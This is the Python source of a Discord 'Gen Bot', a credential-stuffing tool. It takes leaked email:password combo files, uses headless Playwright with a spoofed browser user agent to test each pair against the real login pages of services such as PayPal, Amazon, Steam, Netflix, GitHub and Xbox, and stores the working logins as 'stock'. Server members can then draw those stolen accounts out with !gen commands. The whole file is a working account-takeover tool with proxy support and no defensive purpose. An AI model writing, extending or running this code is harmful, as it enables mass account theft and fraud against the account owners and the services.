import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import io
import re
import json
import random
import string
from datetime import datetime
from collections import defaultdict

# ── ENV ───────────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.environ["BOT_TOKEN"]
LOG_CHANNEL_ID = int(os.environ.get("LOG_CHANNEL_ID", 0))

# ── STATE ─────────────────────────────────────────────────────────────────────
proxy_list: list = []
# stock[service] = list of "email:pass" valid hits
stock: dict = defaultdict(list)
# checked combos to avoid duplicates
checked: set = set()

# ── BOT ───────────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ── CONSTANTS ─────────────────────────────────────────────────────────────────
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# URL keyword → service name mapping
URL_TO_SERVICE = {
    "epicgames":    "epic",
    "epic":         "epic",
    "spotify":      "spotify",
    "netflix":      "netflix",
    "roblox":       "roblox",
    "steam":        "steam",
    "steampowered": "steam",
    "twitter":      "twitter",
    "x.com":        "twitter",
    "instagram":    "instagram",
    "discord":      "discord",
    "github":       "github",
    "twitch":       "twitch",
    "reddit":       "reddit",
    "amazon":       "amazon",
    "paypal":       "paypal",
    "disney":       "disney",
    "disneyplus":   "disney",
    "hulu":         "hulu",
    "crunchyroll":  "crunchyroll",
    "minecraft":    "minecraft",
    "mojang":       "minecraft",
    "ubisoft":      "ubisoft",
    "ea.com":       "ea",
    "origin":       "ea",
    "adobe":        "adobe",
    "xbox":         "xbox",
    "microsoft":    "xbox",
    "live.com":     "xbox",
    "psn":          "psn",
    "playstation":  "psn",
    "nintendo":     "nintendo",
    "binance":      "binance",
    "coinbase":     "coinbase",
    "gitlab":       "gitlab",
    "wordpress":    "wordpress",
    "soundcloud":   "soundcloud",
    "twitch":       "twitch",
    "tidal":        "tidal",
    "plex":         "plex",
    "deezer":       "deezer",
    "vimeo":        "vimeo",
    "imgur":        "imgur",
    "lastfm":       "lastfm",
    "last.fm":      "lastfm",
    "duolingo":     "duolingo",
    "canva":        "canva",
    "patreon":      "patreon",
    "stackoverflow":"stackoverflow",
    "hubspot":      "hubspot",
}

BROWSER_SERVICES = {
    "epic": {
        "url": "https://www.epicgames.com/id/login/epic",
        "email_sel": "#email",
        "pass_sel": "#password",
        "submit_sel": "#sign-in",
        "success": "store.epicgames.com",
        "next": False,
    },
    "spotify": {
        "url": "https://accounts.spotify.com/login",
        "email_sel": "#login-username",
        "pass_sel": "#login-password",
        "submit_sel": "#login-button",
        "success": "open.spotify.com",
        "next": False,
    },
    "netflix": {
        "url": "https://www.netflix.com/login",
        "email_sel": "input[name='userLoginId']",
        "pass_sel": "input[name='password']",
        "submit_sel": "button[type='submit']",
        "success": "netflix.com/browse",
        "next": False,
    },
    "roblox": {
        "url": "https://www.roblox.com/login",
        "email_sel": "#login-username",
        "pass_sel": "#login-password",
        "submit_sel": "#login-button",
        "success": "roblox.com/home",
        "next": False,
    },
    "steam": {
        "url": "https://store.steampowered.com/login/",
        "email_sel": "input[name='username']",
        "pass_sel": "input[name='password']",
        "submit_sel": "button[type='submit']",
        "success": "store.steampowered.com/",
        "next": False,
    },
    "twitter": {
        "url": "https://twitter.com/i/flow/login",
        "email_sel": "input[autocomplete='username']",
        "pass_sel": "input[type='password']",
        "submit_sel": "div[data-testid='LoginButton']",
        "success": "twitter.com/home",
        "next": True,
    },
    "instagram": {
        "url": "https://www.instagram.com/accounts/login/",
        "email_sel": "input[name='username']",
        "pass_sel": "input[name='password']",
        "submit_sel": "button[type='submit']",
        "success": "instagram.com/",
        "next": False,
    },
    "discord": {
        "url": "https://discord.com/login",
        "email_sel": "input[name='email']",
        "pass_sel": "input[name='password']",
        "submit_sel": "button[type='submit']",
        "success": "discord.com/channels",
        "next": False,
    },
    "github": {
        "url": "https://github.com/login",
        "email_sel": "#login_field",
        "pass_sel": "#password",
        "submit_sel": "input[type='submit']",
        "success": "github.com/",
        "next": False,
    },
    "twitch": {
        "url": "https://www.twitch.tv/login",
        "email_sel": "#login-username",
        "pass_sel": "#password-input",
        "submit_sel": "button[data-a-target='passport-login-button']",
        "success": "twitch.tv/",
        "next": False,
    },
    "reddit": {
        "url": "https://www.reddit.com/login/",
        "email_sel": "#loginUsername",
        "pass_sel": "#loginPassword",
        "submit_sel": "button[type='submit']",
        "success": "reddit.com/",
        "next": False,
    },
    "amazon": {
        "url": "https://www.amazon.com/ap/signin",
        "email_sel": "#ap_email",
        "pass_sel": "#ap_password",
        "submit_sel": "#signInSubmit",
        "success": "amazon.com/",
        "next": True,
    },
    "paypal": {
        "url": "https://www.paypal.com/signin",
        "email_sel": "#email",
        "pass_sel": "#password",
        "submit_sel": "#btnLogin",
        "success": "paypal.com/myaccount",
        "next": True,
    },
    "disney": {
        "url": "https://www.disneyplus.com/login",
        "email_sel": "input[type='email']",
        "pass_sel": "input[type='password']",
        "submit_sel": "button[type='submit']",
        "success": "disneyplus.com/home",
        "next": False,
    },
    "hulu": {
        "url": "https://auth.hulu.com/web/login",
        "email_sel": "input[name='email']",
        "pass_sel": "input[name='password']",
        "submit_sel": "button[type='submit']",
        "success": "hulu.com/",
        "next": False,
    },
    "crunchyroll": {
        "url": "https://www.crunchyroll.com/login",
        "email_sel": "#login_form_name",
        "pass_sel": "#login_form_password",
        "submit_sel": "#login_submit_button",
        "success": "crunchyroll.com/",
        "next": False,
    },
    "minecraft": {
        "url": "https://www.minecraft.net/en-us/login",
        "email_sel": "input[type='email']",
        "pass_sel": "input[type='password']",
        "submit_sel": "button[type='submit']",
        "success": "minecraft.net/en-us/",
        "next": False,
    },
    "ubisoft": {
        "url": "https://connect.ubisoft.com/login",
        "email_sel": "#AuthEmail",
        "pass_sel": "#AuthPassword",
        "submit_sel": "#AuthSubmitBtn",
        "success": "connect.ubisoft.com/",
        "next": False,
    },
    "ea": {
        "url": "https://signin.ea.com/p/web2/login",
        "email_sel": "input[type='email']",
        "pass_sel": "input[type='password']",
        "submit_sel": "button[type='submit']",
        "success": "myaccount.ea.com",
        "next": True,
    },
    "adobe": {
        "url": "https://auth.services.adobe.com/en_US/index.html",
        "email_sel": "#EmailPage-EmailField",
        "pass_sel": "#PasswordPage-PasswordField",
        "submit_sel": "#EmailPage-SignInButton",
        "success": "account.adobe.com",
        "next": True,
    },
    "xbox": {
        "url": "https://login.live.com/login.srf",
        "email_sel": "input[type='email']",
        "pass_sel": "input[type='password']",
        "submit_sel": "input[type='submit']",
        "success": "xbox.com/",
        "next": True,
    },
    "psn": {
        "url": "https://www.playstation.com/en-us/sign-in/",
        "email_sel": "input[name='username']",
        "pass_sel": "input[name='password']",
        "submit_sel": "button[type='submit']",
        "success": "playstation.com/",
        "next": False,
    },
}

# ── UTILS ─────────────────────────────────────────────────────────────────────
def get_proxy():
    return random.choice(proxy_list) if proxy_list else None

def rstr(n):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def detect_service(url: str) -> str:
    url = url.lower()
    for keyword, service in URL_TO_SERVICE.items():
        if keyword in url:
            return service
    return "unknown"

def parse_combo_line(line: str):
    """
    Supports formats:
    - https://site.com:email@domain.com:password
    - email@domain.com:password
    - email@domain.com|password
    """
    line = line.strip()
    if not line:
        return None, None, None

    # URL:email:pass format
    url_match = re.match(r"(https?://[^\s:]+):([^:]+@[^:]+):(.+)", line)
    if url_match:
        url      = url_match.group(1)
        email    = url_match.group(2)
        password = url_match.group(3)
        service  = detect_service(url)
        return service, email, password

    # email:pass or email|pass
    for sep in [":", "|", ";"]:
        parts = line.split(sep, 1)
        if len(parts) == 2 and "@" in parts[0]:
            return "unknown", parts[0].strip(), parts[1].strip()

    return None, None, None

# ── BROWSER CHECKER ───────────────────────────────────────────────────────────
async def browser_check(email, password, service):
    cfg = BROWSER_SERVICES.get(service)
    if not cfg:
        return "unsupported", {}

    try:
        from playwright.async_api import async_playwright

        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox",
                      "--disable-dev-shm-usage", "--disable-gpu"]
            )
            ctx = await browser.new_context(
                user_agent=UA,
                viewport={"width": 1280, "height": 720},
                locale="en-US",
            )
            page = await ctx.new_page()

            try:
                await page.goto(cfg["url"], wait_until="domcontentloaded", timeout=25000)
                await asyncio.sleep(2)

                # fill email
                await page.wait_for_selector(cfg["email_sel"], timeout=8000)
                await page.fill(cfg["email_sel"], email)
                await asyncio.sleep(0.5)

                # next button for multi-step logins
                if cfg.get("next"):
                    for btn in ["button[type='submit']", "input[type='submit']", "#continue", "#next"]:
                        try:
                            await page.click(btn, timeout=3000)
                            await asyncio.sleep(2)
                            break
                        except Exception:
                            continue

                # fill password
                await page.wait_for_selector(cfg["pass_sel"], timeout=8000)
                await page.fill(cfg["pass_sel"], password)
                await asyncio.sleep(0.5)

                # submit
                try:
                    await page.click(cfg["submit_sel"], timeout=5000)
                except Exception:
                    await page.keyboard.press("Enter")

                await asyncio.sleep(5)
                url = page.url

            except Exception as ex:
                await browser.close()
                return "error", {"Err": str(ex)[:60]}

            await browser.close()

            if cfg["success"] in url:
                return "hit", {"URL": url[:60]}
            if any(x in url.lower() for x in ["mfa", "otp", "verify", "2fa", "twostep", "challenge"]):
                return "2fa", {}
            return "invalid", {}

    except ImportError:
        return "error", {"Err": "playwright not installed"}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ══════════════════════════════════════════════════════════════════════════════
# EVENTS
# ══════════════════════════════════════════════════════════════════════════════
@bot.event
async def on_ready():
    print("[+] {} online".format(bot.user))
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching,
        name="combos | !help"
    ))

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Admins only.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ Missing: `{}`".format(error.param.name))
    elif isinstance(error, commands.BadArgument):
        await ctx.send("❌ Bad argument.")
    elif isinstance(error, commands.CommandNotFound):
        pass

# ══════════════════════════════════════════════════════════════════════════════
# HELP
# ══════════════════════════════════════════════════════════════════════════════
@bot.command(name="help")
async def cmd_help(ctx):
    e = discord.Embed(title="🛠️ Gen Bot", color=0x5865F2)
    e.add_field(name="📂 Load & Check", value=(
        "`!load` — attach combo `.txt` (url:email:pass or email:pass)\n"
        "Bot sorts by service, checks each one, stores hits in stock"
    ), inline=False)
    e.add_field(name="🎲 Generator", value=(
        "`!gen <service>` — generate one account from stock\n"
        "`!genall` — generate one from every service that has stock"
    ), inline=False)
    e.add_field(name="📦 Stock", value=(
        "`!stock` — show stock count per service\n"
        "`!stockdump <service>` — export all stock for a service"
    ), inline=False)
    e.add_field(name="🔍 Manual Check", value=(
        "`!check <service> email:pass` or attach `.txt`"
    ), inline=False)
    e.add_field(name="🌐 Proxies", value="`!addproxy` `!proxycount` `!clearproxy`", inline=False)
    e.add_field(name="📁 Export", value="`!export` — all hits\n`!stats`", inline=False)
    services = ", ".join("`{}`".format(s) for s in sorted(BROWSER_SERVICES.keys()))
    e.add_field(name="✅ Supported Services", value=services, inline=False)
    await ctx.send(embed=e)

# ══════════════════════════════════════════════════════════════════════════════
# LOAD — sort + check big combo file
# ══════════════════════════════════════════════════════════════════════════════
@bot.command(name="load")
@commands.has_permissions(administrator=True)
async def cmd_load(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Attach a `.txt` combo file."); return

    all_lines = []
    for a in ctx.message.attachments:
        if a.filename.endswith(".txt"):
            raw = await a.read()
            all_lines += raw.decode(errors="ignore").splitlines()

    if not all_lines:
        await ctx.send("❌ No lines found."); return

    # sort into buckets
    buckets = defaultdict(list)
    skipped = 0
    for line in all_lines:
        service, email, password = parse_combo_line(line)
        if not service or not email or not password:
            skipped += 1
            continue
        combo_key = "{}:{}:{}".format(service, email, password)
        if combo_key in checked:
            continue
        checked.add(combo_key)
        buckets[service].append((email, password))

    total_combos = sum(len(v) for v in buckets.items() if isinstance(v, list))

    # summary of what was sorted
    sort_embed = discord.Embed(title="📂 Sorted Combos", color=0x5865F2)
    sort_embed.add_field(name="📋 Total Lines", value=str(len(all_lines)), inline=True)
    sort_embed.add_field(name="⏭️ Skipped",     value=str(skipped),         inline=True)

    service_summary = ""
    for svc, pairs in sorted(buckets.items()):
        service_summary += "**{}**: {} combos\n".format(svc.upper(), len(pairs))
    if service_summary:
        sort_embed.add_field(name="🗂️ By Service", value=service_summary, inline=False)
    sort_embed.add_field(name="❓ Unknown Service", value=str(len(buckets.get("unknown", []))), inline=True)

    await ctx.send(embed=sort_embed)

    log_ch = bot.get_channel(LOG_CHANNEL_ID) or ctx.channel

    # check each bucket
    for service, pairs in buckets.items():
        if service == "unknown" or service not in BROWSER_SERVICES:
            # skip unknown or unsupported
            continue

        msg = await ctx.send("🌐 Checking **{}** combos for **{}**…".format(len(pairs), service.upper()))
        hits = 0
        invalid = 0
        errors = 0
        twofa = 0

        for i, (email, password) in enumerate(pairs, 1):
            status, details = await browser_check(email, password, service)

            color = {
                "hit": 0x57F287, "2fa": 0xEB459E,
                "invalid": 0x2F3136, "error": 0x747F8D,
            }.get(status, 0x747F8D)

            label = {
                "hit": "✅ Hit", "2fa": "🔐 2FA",
                "invalid": "❌ Invalid", "error": "💥 Error",
            }.get(status, status)

            e = discord.Embed(
                title="{} [{}/{}]".format(service.upper(), i, len(pairs)),
                color=color
            )
            e.add_field(name="Status", value=label, inline=False)
            e.add_field(name="📧 Email", value=email, inline=True)
            e.add_field(name="🔑 Pass", value="||{}||".format(password), inline=True)
            e.timestamp = datetime.utcnow()
            await log_ch.send(embed=e)

            if status == "hit":
                hits += 1
                stock[service].append("{}:{}".format(email, password))
            elif status == "2fa":
                twofa += 1
                stock[service].append("[2FA] {}:{}".format(email, password))
            elif status == "error":
                errors += 1
            else:
                invalid += 1

            await asyncio.sleep(2)

        summary = discord.Embed(
            title="📊 {} — Done".format(service.upper()), color=0x5865F2
        )
        summary.add_field(name="✅ Hits",    value=str(hits),    inline=True)
        summary.add_field(name="🔐 2FA",     value=str(twofa),   inline=True)
        summary.add_field(name="❌ Invalid", value=str(invalid), inline=True)
        summary.add_field(name="💥 Errors",  value=str(errors),  inline=True)
        summary.add_field(name="📦 In Stock", value=str(len(stock[service])), inline=True)
        summary.timestamp = datetime.utcnow()
        await ctx.send(embed=summary)
        await msg.delete()

    # final stock overview
    final = discord.Embed(title="✅ Load Complete — Stock Overview", color=0x57F287)
    for svc in sorted(stock.keys()):
        if stock[svc]:
            final.add_field(name=svc.upper(), value=str(len(stock[svc])), inline=True)
    final.timestamp = datetime.utcnow()
    await ctx.send(embed=final)

# ══════════════════════════════════════════════════════════════════════════════
# MANUAL CHECK
# ══════════════════════════════════════════════════════════════════════════════
@bot.command(name="check")
@commands.has_permissions(administrator=True)
async def cmd_check(ctx, service: str = None, *args):
    if not service:
        await ctx.send("❌ Usage: `!check <service> email:pass`"); return

    service = service.lower()
    if service not in BROWSER_SERVICES:
        await ctx.send("❌ Unknown service. Use `!help`."); return

    pairs = []
    if ctx.message.attachments:
        for a in ctx.message.attachments:
            if a.filename.endswith(".txt"):
                raw = await a.read()
                for line in raw.decode().splitlines():
                    _, email, password = parse_combo_line(line)
                    if email and password:
                        pairs.append((email, password))
    for arg in args:
        _, email, password = parse_combo_line(arg)
        if email and password:
            pairs.append((email, password))

    if not pairs:
        await ctx.send("❌ No combos found."); return

    total  = len(pairs)
    log_ch = bot.get_channel(LOG_CHANNEL_ID) or ctx.channel
    msg    = await ctx.send("🌐 Checking **{}** combo(s) on **{}**…".format(total, service.upper()))
    stats  = {"✅ Hits": 0, "🔐 2FA": 0, "❌ Invalid": 0, "💥 Error": 0}

    for i, (email, password) in enumerate(pairs, 1):
        status, details = await browser_check(email, password, service)

        color = {"hit": 0x57F287, "2fa": 0xEB459E, "invalid": 0x2F3136, "error": 0x747F8D}.get(status, 0x747F8D)
        label = {"hit": "✅ Hit", "2fa": "🔐 2FA", "invalid": "❌ Invalid", "error": "💥 Error"}.get(status, status)

        e = discord.Embed(title="{} Checker [{}/{}]".format(service.upper(), i, total), color=color)
        e.add_field(name="Status", value=label, inline=False)
        e.add_field(name="📧 Email", value=email, inline=True)
        e.add_field(name="🔑 Pass", value="||{}||".format(password), inline=True)
        for k, v in details.items():
            e.add_field(name=k, value=str(v), inline=True)
        e.timestamp = datetime.utcnow()
        await log_ch.send(embed=e)

        if status == "hit":
            stats["✅ Hits"] += 1
            stock[service].append("{}:{}".format(email, password))
        elif status == "2fa":
            stats["🔐 2FA"] += 1
            stock[service].append("[2FA] {}:{}".format(email, password))
        elif status == "error":
            stats["💥 Error"] += 1
        else:
            stats["❌ Invalid"] += 1

        await asyncio.sleep(2)

    summary = discord.Embed(title="📊 {} — Done".format(service.upper()), color=0x5865F2)
    for k, v in stats.items():
        summary.add_field(name=k, value=str(v), inline=True)
    summary.timestamp = datetime.utcnow()
    await ctx.send(embed=summary)
    await msg.delete()

# ══════════════════════════════════════════════════════════════════════════════
# GENERATOR
# ══════════════════════════════════════════════════════════════════════════════
@bot.command(name="gen")
async def cmd_gen(ctx, service: str = None):
    if not service:
        await ctx.send("❌ Usage: `!gen <service>`"); return

    service = service.lower()
    items   = stock.get(service, [])

    if not items:
        await ctx.send("📭 No stock for **{}**.".format(service.upper())); return

    # pop from stock
    account = items.pop(0)
    parts   = account.replace("[2FA] ", "").split(":", 1)
    email   = parts[0] if len(parts) > 0 else "N/A"
    pw      = parts[1] if len(parts) > 1 else "N/A"
    is_2fa  = "[2FA]" in account

    e = discord.Embed(title="🎲 {} Account Generated".format(service.upper()), color=0x57F287)
    e.add_field(name="📧 Email",    value="||{}||".format(email), inline=True)
    e.add_field(name="🔑 Password", value="||{}||".format(pw),    inline=True)
    if is_2fa:
        e.add_field(name="⚠️ Note", value="This account has 2FA enabled", inline=False)
    e.add_field(name="📦 Remaining Stock", value=str(len(items)), inline=False)
    e.timestamp = datetime.utcnow()
    await ctx.send(embed=e)

@bot.command(name="genall")
async def cmd_genall(ctx):
    has_stock = {s: items for s, items in stock.items() if items}
    if not has_stock:
        await ctx.send("📭 No stock available."); return

    e = discord.Embed(title="🎲 Generated From All Services", color=0x57F287)
    for service, items in sorted(has_stock.items()):
        account = items.pop(0)
        parts   = account.replace("[2FA] ", "").split(":", 1)
        email   = parts[0] if len(parts) > 0 else "N/A"
        pw      = parts[1] if len(parts) > 1 else "N/A"
        e.add_field(
            name="{}{}".format(service.upper(), " [2FA]" if "[2FA]" in account else ""),
            value="||{}:{}||".format(email, pw),
            inline=False
        )
    e.timestamp = datetime.utcnow()
    await ctx.send(embed=e)

# ══════════════════════════════════════════════════════════════════════════════
# STOCK
# ══════════════════════════════════════════════════════════════════════════════
@bot.command(name="stock")
async def cmd_stock(ctx):
    has_stock = {s: items for s, items in stock.items() if items}
    if not has_stock:
        await ctx.send("📭 Stock is empty."); return

    e = discord.Embed(title="📦 Current Stock", color=0x5865F2)
    total = 0
    for service, items in sorted(has_stock.items()):
        e.add_field(name=service.upper(), value="**{}** accounts".format(len(items)), inline=True)
        total += len(items)
    e.set_footer(text="Total: {} accounts".format(total))
    e.timestamp = datetime.utcnow()
    await ctx.send(embed=e)

@bot.command(name="stockdump")
@commands.has_permissions(administrator=True)
async def cmd_stockdump(ctx, service: str = None):
    if not service:
        await ctx.send("❌ Usage: `!stockdump <service>`"); return

    service = service.lower()
    items   = stock.get(service, [])
    if not items:
        await ctx.send("📭 No stock for **{}**.".format(service.upper())); return

    buf = io.BytesIO("\n".join(items).encode())
    buf.seek(0)
    await ctx.send(
        "📁 **{}** accounts for **{}**:".format(len(items), service.upper()),
        file=discord.File(buf, filename="{}_stock.txt".format(service))
    )

# ══════════════════════════════════════════════════════════════════════════════
# PROXY
# ══════════════════════════════════════════════════════════════════════════════
@bot.command(name="addproxy")
@commands.has_permissions(administrator=True)
async def cmd_addproxy(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Attach a `.txt` of proxies."); return
    added = 0
    for a in ctx.message.attachments:
        if a.filename.endswith(".txt"):
            raw = await a.read()
            for line in raw.decode().splitlines():
                p = line.strip()
                if p:
                    proxy_list.append(p); added += 1
    await ctx.send("✅ Added **{}** proxies. Total: **{}**".format(added, len(proxy_list)))

@bot.command(name="proxycount")
async def cmd_proxycount(ctx):
    await ctx.send("🌐 **{}** proxies loaded.".format(len(proxy_list)))

@bot.command(name="clearproxy")
@commands.has_permissions(administrator=True)
async def cmd_clearproxy(ctx):
    proxy_list.clear()
    await ctx.send("✅ Proxy list cleared.")

# ══════════════════════════════════════════════════════════════════════════════
# EXPORT / STATS
# ══════════════════════════════════════════════════════════════════════════════
@bot.command(name="export")
@commands.has_permissions(administrator=True)
async def cmd_export(ctx):
    all_hits = []
    for service, items in stock.items():
        for item in items:
            all_hits.append("[{}] {}".format(service.upper(), item))
    if not all_hits:
        await ctx.send("📭 No hits in stock."); return
    buf = io.BytesIO("\n".join(all_hits).encode())
    buf.seek(0)
    await ctx.send("📁 **{}** total accounts:".format(len(all_hits)),
                   file=discord.File(buf, filename="all_hits.txt"))

@bot.command(name="stats")
async def cmd_stats(ctx):
    total = sum(len(v) for v in stock.values())
    e = discord.Embed(title="📈 Stats", color=0x5865F2)
    e.add_field(name="📦 Total Stock",    value=str(total),            inline=True)
    e.add_field(name="🗂️ Services",       value=str(len(stock)),        inline=True)
    e.add_field(name="🌐 Proxies",        value=str(len(proxy_list)),   inline=True)
    e.add_field(name="🔍 Checked Combos", value=str(len(checked)),      inline=True)
    e.timestamp = datetime.utcnow()
    await ctx.send(embed=e)

# ── RUN ───────────────────────────────────────────────────────────────────────
bot.run(BOT_TOKEN)
